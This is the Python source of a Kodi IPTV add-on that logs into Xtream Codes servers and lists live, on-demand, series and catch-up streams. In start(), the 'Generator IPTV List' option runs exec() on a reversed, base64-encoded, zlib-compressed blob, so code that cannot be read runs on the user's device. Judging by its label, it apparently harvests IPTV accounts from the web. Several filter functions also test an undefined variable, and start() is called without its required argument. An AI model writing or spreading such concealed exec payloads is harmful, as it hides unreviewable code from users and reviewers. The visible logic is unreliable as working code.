#!/usr/bin/python														   #
# -*- coding: utf-8 -*-													   #
############################################################################
#							  /T /I										   #
#							   / |/ | .-~/								   #
#						   T\ Y	 I	|/	/  _							   #
#		  /T			   | \I	 |	I  Y.-~/							   #
#		 I l   /I		T\ |  |	 l	|  T  /								   #
#	  T\ |	\ Y l  /T	| \I  l	  \ `  l Y								   #
# __  | \l	 \l	 \I l __l  l   \   `  _. |								   #
# \ ~-l	 `\	  `\  \	 \ ~\  \   `. .-~	|								   #
#  \   ~-. "-.	`  \  ^._ ^. "-.  /	 \	 |								   #
#.--~-._  ~-  `	 _	~-_.-"-." ._ /._ ." ./								   #
# >--.	~-.	  ._  ~>-"	  "\   7   7   ]								   #
#^.___~"--._	~-{	 .-~ .	`\ Y . /	|								   #
# <__ ~"-.	~		/_/	  \	  \I  Y	  : |								   #
#	^-.__			~(_/   \   >._:	  | l______							   #
#		^--.,___.-~"  /_/	!  `-.~"--l_ /	   ~"-.						   #
#			   (_/ .  ~(   /'	  "~"--,Y	-=b-. _)					   #
#				(_/ .  \  Fire TV Guru/ l	   c"~o \					   #
#				 \ /	`.	  .		.^	 \_.-~"~--.	 )					   #
#				  (_/ .	  `	 /	   /	   !	   )/					   #
#				   / / _.	'.	 .':	  /		   '					   #
#				   ~(_/ .	/	 _	`  .-<_								   #
#					 /_/ . ' .-~" `.  / \  \		  ,z=.				   #
#					 ~( /	'  :   | K	 "-.~-.______//					   #
#					   "-,.	   l   I/ \_	__{--->._(==.				   #
#						//(		\  <	~"~"	 //						   #
#					   /' /\	 \	\	  ,v=.	((						   #
#					 .^. / /\	  "	 }__ //===-	 `						   #
#					/ / ' '	 "-.,__ {---(==-							   #
#				  .^ '		 :	T  ~"	ll								   #
#				 / .  .	 . : | :!		 \								   #
#				(_/	 /	 | | j-"		  ~^							   #
#				  ~-<_(_.^-~"											   #
#																		   #
############################################################################

#############################=IMPORTS=######################################
	#Kodi Specific
import sys
PY3 = sys.version_info[0] == 3
import xbmc,xbmcaddon,xbmcgui,xbmcplugin,xbmcvfs
	#Python Specific
import base64,os,re,time,sys,urllib.request
import urllib.parse,urllib.error,json,datetime,shutil
import xml.dom.minidom
from xml.dom.minidom import Node
from datetime import datetime,timedelta
	#Addon Specific
from resources.modules import control,tools,popup,speedtest
if PY3:
	from urllib.parse import quote, quote_plus, unquote_plus, unquote, urlparse	
else:
	from urllib import quote, quote_plus, unquote_plus, unquote
	from urlparse import urlparse
##########################=VARIABLES=#######################################
ADDON = xbmcaddon.Addon()
ADDONPATH = ADDON.getAddonInfo("path")
ADDON_NAME = ADDON.getAddonInfo("name")
ADDON_ID = ADDON.getAddonInfo('id')

DIALOG			  = xbmcgui.Dialog()
DP				  = xbmcgui.DialogProgress()
HOME			  = xbmcvfs.translatePath('special://home/')
ADDONS			  = os.path.join(HOME,	   'addons')
USERDATA		  = os.path.join(HOME,	   'userdata')
PLUGIN			  = os.path.join(ADDONS,   ADDON_ID)
PACKAGES		  = os.path.join(ADDONS,   'packages')
ADDONDATA		  = os.path.join(USERDATA, 'addon_data', ADDON_ID)
ADVANCED		  = os.path.join(USERDATA,	'advancedsettings.xml')
advanced_settings = os.path.join(PLUGIN,'resources', 'advanced_settings')
MEDIA			  = os.path.join(ADDONS,  PLUGIN , 'resources', 'media')
KODIV			  = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
M3U_PATH		  = os.path.join(ADDONDATA,  'm3u.m3u')
##########################=ART PATHS=#######################################
icon			  = os.path.join(PLUGIN,  'icon.png')
fanart			  = os.path.join(PLUGIN,  'fanart.jpg')
background		  = os.path.join(MEDIA,   'background.jpg')
live			  = os.path.join(MEDIA,   'live.jpg')
catch			  = os.path.join(MEDIA,   'cu.jpg')
Moviesod		  = os.path.join(MEDIA,   'movie.jpg')
Tvseries		  = os.path.join(MEDIA,   'tv.jpg')
iconextras		  = os.path.join(MEDIA,   'iconextras.png')
iconsettings	  = os.path.join(MEDIA,   'iconsettings.png')
iconlive		  = os.path.join(MEDIA,   'iconlive.png')
iconcatchup		  = os.path.join(MEDIA,   'iconcatchup.png')
iconMoviesod	  = os.path.join(MEDIA,   'iconmovies.png')
iconTvseries	  = os.path.join(MEDIA,   'icontvseries.png')
iconsearch		  = os.path.join(MEDIA,   'iconsearch.png')
iconaccount		  = os.path.join(MEDIA,   'iconaccount.png')
icontvguide		  = os.path.join(MEDIA,   'iconguide.png')

#########################=XC VARIABLES=#####################################
dns				  = control.setting('DNS')
username		  = control.setting('Username')
password		  = control.setting('Password')
dns_unblock		  = control.setting('dns_unblock')
live_url = '{0}/player_api.php?username={1}&password={2}&action=get_live_categories'.format(dns, username, password)
vod_url = '{0}/player_api.php?username={1}&password={2}&action=get_vod_categories'.format(dns, username, password)
series_url = '{0}/player_api.php?username={1}&password={2}&action=get_series_categories'.format(dns, username, password)
panel_api		  = '{0}/panel_api.php?username={1}&password={2}'.format(dns,username,password)
player_api		  = '{0}/player_api.php?username={1}&password={2}'.format(dns,username,password)
play_url		  = '{0}/live/{1}/{2}/'.format(dns,username,password)
play_live		  = '{0}/{1}/{2}/'.format(dns,username,password)
play_movies		  = '{0}/movie/{1}/{2}/'.format(dns,username,password)
play_series		  = '{0}/series/{1}/{2}/'.format(dns,username,password)
#############################################################################
adult_tags = ['xxx','xXx','XXX','adult','Adult','ADULT','adults','Adults','ADULTS','porn','Porn','PORN']

def get_kversion():
	full_version_info = xbmc.getInfoLabel('System.BuildVersion')
	baseversion = full_version_info.split(".")
	intbase = int(baseversion[0])
	return intbase

def buildcleanurl(url):
	url = str(url).replace('USERNAME',username).replace('PASSWORD',password)
	return url

def start(signin):
	if username == "":
		choice = xbmcgui.Dialog().yesno('[B][COLOR blue]XCUI Streams[/COLOR][/B]', '[COLOR white]Επιθυμείτε να εισάγετε τον λογαριασμό χειροκίνητα[CR]ή μέσω του [COLOR lime]Generator IPTV List[COLOR white] αυτοματοποιημένης εύρεσης λίστας διαδικτυακά;[/COLOR]',
										yeslabel='[B][COLOR lime]Generator[/COLOR][/B]', nolabel='[B][COLOR orange]Χειροκίνητα[/COLOR][/B]')
		if choice == 1: _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

		else:
			dns = tools.keypopup('Enter DNS ex: http://dns.com:port')
			usern = tools.keypopup('Enter Username')
			passw = tools.keypopup('Enter Password')
			control.setSetting('DNS',dns)
			control.setSetting('Username',usern)
			control.setSetting('Password',passw)
			xbmc.executebuiltin('Container.Refresh')
			auth_url = '{0}/player_api.php?username={1}&password={2}'.format(dns,usern,passw)
			parse = tools.OPEN_URL(auth_url)
			
			login_data = parse['user_info']['auth']
			if login_data == 0:
				line1 = "Incorrect Login Details"
				line2 = "Please Re-enter" 
				line3 = "" 
				xbmcgui.Dialog().ok('Attention', line1+'\n'+line2+'\n'+line3)
				start()
			else:
				line1 = "Login Sucsessfull"
				line2 = "Welcome to "+ADDON_NAME
				line3 = ('[B][COLOR white]%s[/COLOR][/B]'%usern)
				xbmcgui.Dialog().ok(ADDON_NAME, line1+'\n' + line2 +'\n' + line3)
				adult_set()
				#tvguidesetup()
				#addonsettings('ADS2','')
				xbmc.executebuiltin('Container.Refresh')
				home()
	else:
		home()

def home():
	tools.addDir('[B]Account Information[/B]','url',6,iconaccount,background,'')
	tools.addDir('[B]Live TV[/B]','live',1,iconlive,background,'')
	tools.addDir('[B]TV Series[/B]','live',18,iconTvseries,background,'')
	if xbmc.getCondVisibility('System.HasAddon(pvr.iptvsimple)'):
		tools.addDir('[B]TV Guide[/B]','pvr',7,icontvguide,background,'')
	tools.addDir('[B]Catchup TV[/B]','url',12,iconcatchup,background,'')
	tools.addDir('[B]Video On Demand[/B]','vod',3,iconMoviesod,background,'')
	tools.addDir('[B]Search[/B]','url',5,iconsearch,background,'')
	tools.addDir('[B]Settings[/B]','url',8,iconsettings,background,'')
	tools.addDir('[B]Extras[/B]','url',16,iconextras,background,'')

def livecategory():
	vod_cat = tools.OPEN_URL(live_url)
	for cat in vod_cat:
		mystring = cat['category_name'] 
		if xbmcaddon.Addon().getSetting('hidexxx')=='false':
			tools.addDir(mystring,player_api + '&action=get_live_streams&category_id=' + str(cat['category_id']), 2, icon, background, '')
		else :
			if not any(s in name for s in adult_tags):
				tools.addDir(mystring,player_api + '&action=get_live_streams&category_id=' + str(cat['category_id']), 2, icon,background, '')

def Livelist(url):
	vod_cat = tools.OPEN_URL(url)
	background = os.path.join(MEDIA, 'background.jpg')
	for cat in vod_cat:
		url = play_live + str(cat['stream_id'])
		try:
			thumb = cat['stream_icon']
		except:
			thumb =  icon
		if xbmcaddon.Addon().getSetting('hidexxx') == 'false':
			tools.addDir(cat['name'], url, 4, str(thumb), background, '')
		else:
			if not any(s in name for s in adult_tags):
				tools.addDir(cat['name'], url, 4, str(thumb), background, '')

def series_cats(url):
	vod_cat = tools.OPEN_URL(player_api+'&action=get_series_categories')
	
	for cat in vod_cat:
		if xbmcaddon.Addon().getSetting('hidexxx')=='false':
			tools.addDir(cat['category_name'],player_api+'&action=get_series&category_id='+str(cat['category_id']),25,icon,background,'')
		else:
			if not any(s in name for s in adult_tags):
				tools.addDir(cat['category_name'],player_api+'&action=get_series&category_id='+str(cat['category_id']),25,icon,background,'')

# categoria series
def serieslist(url): 
	ser_cat = tools.OPEN_URL(url)
	background = ''
	if not 'releaseDate'  in ser_cat:  
		cont = 0
	else: 
		cont = 1

	for ser in ser_cat:
		name = ser['name']
		
		url = player_api + '&action=get_series_info&series_id=' + str(ser['series_id'])
		try:
			thumb = ser['cover']
			background = ser['backdrop_path'][0]
			plot = ser['plot']
			releaseDate = ser['releaseDate']
			cast = str(ser['cast']).split()
			rating_5based = ser['rating_5based']
			episode_run_time = str(ser['episode_run_time'])
			genre = ser['genre']
		except:
			thumb = icon
			plot = ''
			releasedate = 2023
			cast = ('', '')
			rating_5based = ''
			episode_run_time = ''
			genre = ''

		if not background.strip():
			background = os.path.join(MEDIA, 'background.jpg')
		if cont == 0:
			releasedate = '2022-01-01' 
		#if not releasedate.2strip(): datetime.strptime(date_time_str, '%d/%m/%y %H:%M:%S'

		if xbmcaddon.Addon().getSetting('meta') == 'true':
			tools.addDirMeta(name, url, 19, str(thumb), background, plot, str(releasedate), cast, rating_5based, episode_run_time,
							 genre)
		else:
			# tools.log('[FTG]--')
			tools.addDir(name, url, 19, str(thumb), background, '')

def series_seasons(url):
	ser_cat = tools.OPEN_URL(url)
	if not 'episodes'  in ser_cat:
		return
	for ser in ser_cat['episodes']:
		info = ser_cat['info']
		try:
			thumb = info['cover']
		except:
			thumb = ''
		try:
			background = info['backdrop_path'][0]
		except:
			background = ''
		if not background.strip():
			background = os.path.join(MEDIA, 'background.jpg')	
		tools.addDir('Season - ' + ser, url + '&season_number=' + str(ser), 20, str(thumb), background, '')

# listar seasons
def season_list(url):
	tools.log(url)
	ser_cat = tools.OPEN_URL(url)

	info = ser_cat['info']
	ser_cat = ser_cat['episodes']

	from urllib.parse import urlparse, parse_qs
	parsed_url = urlparse(url)
	season_number = str(parse_qs(parsed_url.query)['season_number'][0])
	if not 'releaseDate'  in ser_cat[season_number]:  
		cont = 0
	else: 
		cont = 1 
	for ser in ser_cat[season_number]:
		url = play_series + str(ser['id']) + '.' + ser['container_extension']
		try:
			thumb = ser['info']['movie_image']
		except:
			thumb = ''
		try:
			background = ser['info']['movie_image']
		except:
			background = ''
		try:
			plot = ser['info']['plot']
		except:
			plot = ''
		try:
			releasedate = ser['info']['releasedate']
		except:
			releasedate = ''
		try:
			cast = str(info['cast']).split()
		except:
			cast = ('', '')
		try:
			rating_5based = info['rating_5based']
		except:
			rating_5based = ''
		try:
			duration = str(ser['info']['duration'])
		except:
			duration = ''
		try:
			genre = info['genre']
		except:
			genre = ''
		if not background:
			background = os.path.join(MEDIA, 'background.jpg')
		if cont == 0:
			releasedate = '2022-01-01'
		if xbmcaddon.Addon().getSetting('meta') == 'true':
			tools.log(cast)
			tools.addDirMeta(ser['title'], url, 4, str(thumb), background, plot, str(releasedate), cast, rating_5based, duration,
							 genre)
		else:
			tools.addDir(ser['title'], url, 4, str(thumb), background, '')	

def Vodlist(url):
		vod_cat = tools.OPEN_URL(url)

		background = os.path.join(MEDIA, 'background.jpg')
		for cat in vod_cat:
			try:
				thumb = cat['stream_icon']
			except:
				thumb = icon
			url = play_movies + str(cat['stream_id'])+'.' + cat['container_extension']
			if xbmcaddon.Addon().getSetting('hidexxx') == 'false':
				tools.addDir(str(cat['name']), url, 4, str(thumb), background, '')
			else:
				if not any(s in name for s in adult_tags):
					tools.addDir(str(cat['name']), url, 4, str(thumb), background, '')
def vod(url):
	vod_cat = tools.OPEN_URL(vod_url)

	for cat in vod_cat:
		mystring = cat['category_name'] 
		if xbmcaddon.Addon().getSetting('hidexxx') == 'false':
			tools.addDir(mystring,
						 player_api + '&action=get_vod_streams&category_id=' + str(cat['category_id']), 9, icon,
						 background, '')
		else:
			if not any(s in name for s in adult_tags):
				tools.addDir(mystring,
							 player_api + '&action=get_vod_streams&category_id=' + str(cat['category_id']), 9, icon,
							 background, '')


def search():
	if mode==3:
		return False
	text = searchdialog()
	xbmc.log(str(text))
	open = tools.OPEN_URL2(panel_api)
	parse = json.loads(open)
	all_chans = tools.regex_get_all(open,'{"num":','}')
	for a in all_chans:
		name = tools.regex_from_to(a,'name":"','"')
		url	 = tools.regex_from_to(a,'"stream_id":"','"')
		thumb= tools.regex_from_to(a,'stream_icon":"','"').replace('\/','/')
		stream_type = tools.regex_from_to(a,'"stream_type":"','"').replace('\/','/')
		container_extension = tools.regex_from_to(a,'container_extension":"','"')
		if text in name.lower():
			if xbmcaddon.Addon().getSetting('hidexxx')=='false':
				if 'movie' in stream_type:
					tools.addDir(name,play_movies+url+'.'+container_extension,4,thumb,background,'')
				if 'live' in stream_type:
					tools.addDir(name,play_live+url,4,thumb,background,'')
			else:
				if not any(s in name for s in adult_tags):
					if 'movie' in stream_type:
						tools.addDir(name,play_movies+url+'.'+container_extension,4,thumb,background,'')
					if 'live' in stream_type:
						tools.addDir(name,play_live+url,4,thumb,background,'')
		elif text not in name.lower() and text in name:
			if xbmcaddon.Addon().getSetting('hidexxx')=='false':
				if 'movie' in stream_type:
					tools.addDir(name,play_movies+url+'.'+container_extension,4,thumb,background,'')
				if 'live' in stream_type:
					tools.addDir(name,play_live+url,4,thumb,background,'')
			else:
				if not any(s in name for s in adult_tags):
					if 'movie' in stream_type:
						tools.addDir(name,play_movies+url+'.'+container_extension,4,thumb,background,'')
					if 'live' in stream_type:
						tools.addDir(name,play_live+url,4,thumb,background,'')

#def catchup():
#	data = tools.OPEN_URL(panel_api+'&action=get_live_streams')

#	for streams in data:
#		if not streams['tv_archive']:
#			continue
#		try:
#			thumb = streams['stream_icon']
#		except:
#			thumb = iconcatchup
#		name = streams['name']
#		stream_id = str(streams['stream_id'])
#		if not name=="":
#				tools.addDir(name,'url',13,str(thumb),background,stream_id)

def catchup():
	open = tools.OPEN_URL2(panel_api)
	all	 = tools.regex_get_all(open,'{"num','direct')
	for a in all:
		if '"tv_archive":1' in a:
			name = tools.regex_from_to(a,'"epg_channel_id":"','"').replace('\/','/')
			thumb= tools.regex_from_to(a,'"stream_icon":"','"').replace('\/','/')
			sid	 = tools.regex_from_to(a,'stream_id":"','"')
			if not name=="":
				tools.addDir(name,'url',13,thumb,background,sid)


def tvarchive(name,description):
	APIv2 = "{0}/player_api.php?username={1}&password={2}&action=get_simple_data_table&stream_id={3}".format(dns,username,password,description)
	data = tools.OPEN_URL(APIv2)

	for streams in data['epg_listings']:
		if not streams['has_archive']:
			continue
		if not streams['start']:
			continue
		name = base64.b64decode(streams['title']).decode('UTF-8')
		stream_id = streams['id']
		plot = base64.b64decode(streams['description']).decode('UTF-8')
		start = streams['start']
		end = streams['end']
		format = '%Y-%m-%d %H:%M:%S'
		start_obj = datetime(*(time.strptime(start, format)[0:6]))
		end_obj = datetime(*(time.strptime(end, format)[0:6]))
		start_api_obj = start_obj.strftime('%Y-%m-%d:%H-%M')
		end_api_obj = end_obj.strftime('%Y-%m-%d:%H-%M')
		difference = end_obj - start_obj
		duration = difference.total_seconds()
		duration = round(duration / 60)
		start2 = start[:-3]
		editstart = start2
		start2 = str(start2).replace(' ',' - ')
		catchupURL = "{0}/streaming/timeshift.php?username={1}&password={2}&stream={3}&start=".format(dns,username,password,description)
		ResultURL = catchupURL + str(start_api_obj) + "&duration={0}".format(duration)
		Fname = "[B][COLOR white]{0}[/COLOR][/B] - {1}".format(start2,name)
		tools.addDir(Fname,ResultURL,4,iconcatchup,background,plot)

#############################

def tvguide():
		xbmc.executebuiltin('ActivateWindow(TVGuide)')

# converter

def basename(p):
	"""Returns the final component of a pathname"""
	i = p.rfind('/') + 1
	return p[i:]

def ts_to_m3u8(url):
	try:
		url = unquote_plus(url)
	except:
		pass
	try:
		url = unquote(url)
	except:
		pass
	if '|' in url:
		url = url.split('|')[0]
	elif '%7C' in url:
		url = url.split('%7C')[0]
	if not '.m3u8' in url and not '/hl' in url and int(url.count("/")) > 4 and not '.mp4' in url and not '.avi' in url:
		parsed_url = urlparse(url)
		try:
			host_part1 = '%s://%s'%(parsed_url.scheme,parsed_url.netloc)
			host_part2 = url.split(host_part1)[1]
			url = host_part1 + '/live' + host_part2
			file = basename(url)
			if '.ts' in file:
				file_new = file.replace('.ts', '.m3u8')
				url = url.replace(file, file_new)
			else:
				url = url + '.m3u8'
				# file_new = file + '.m3u8'
				# new_url = url.replace(file, file_new)
		except:
			pass
	return url 

# player
def stream_video(url,iconimage):
	if not iconimage:
		try:
			iconimage = xbmc.getInfoLabel('ListItem.Thumb')
		except:
			try:
				iconimage = xbmc.getInfoLabel('ListItem.Icon')
			except:
				iconimage = ''
	if iconimage:
		icon = iconimage
	else:
		icon = ''
	url = buildcleanurl(url)
	headers = '|User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
	#url = url + headers
	try:
		name = xbmc.getInfoLabel('ListItem.Label')
	except:
		name = ''
	description = ''
	if not '.mp4' in url and not '.avi' in url and not '.rmv' in url and not 'rmvb' in url:
		check = True
	else:
		check = False
	if dns_unblock == 'true' and check == True:
		name = 'XCUI' if not name else name
		url = ts_to_m3u8(url)
		url = url + headers
		if '.m3u8' in url and not 'plugin' in url:
			import hlsretry
			url = 'http://%s:%s/?url=%s'%(str(hlsretry.HOST_NAME),str(hlsretry.PORT_NUMBER),quote(url))
			hlsretry.XtreamProxy().start()	
			liz = xbmcgui.ListItem(name)
			liz.setArt({'icon':icon, 'thumb':icon})
			if get_kversion() > 19:
				info = liz.getVideoInfoTag()
				info.setTitle(name)
				info.setMediaType('video')
				info.setPlot(description)
			else:
				liz.setInfo(type='Video', infoLabels={'Title': name, 'Plot': description})
			#liz.setProperty('IsPlayable','true')
			liz.setPath(str(url))
			xbmc.Player().play(item=url, listitem=liz)
		else:
			url = url + headers
			liz = xbmcgui.ListItem(name)
			liz.setArt({'icon':icon, 'thumb':icon})
			if get_kversion() > 19:
				info = liz.getVideoInfoTag()
				info.setTitle(name)
				info.setMediaType('video')
				info.setPlot(description)
			else:
				liz.setInfo(type='Video', infoLabels={'Title': name, 'Plot': description})
			#liz.setProperty('IsPlayable','true')
			liz.setPath(str(url))
			xbmc.Player().play(item=url, listitem=liz)
	elif dns_unblock == 'true' and check == False:
		name = 'XCUI' if not name else name
		import mp4retry
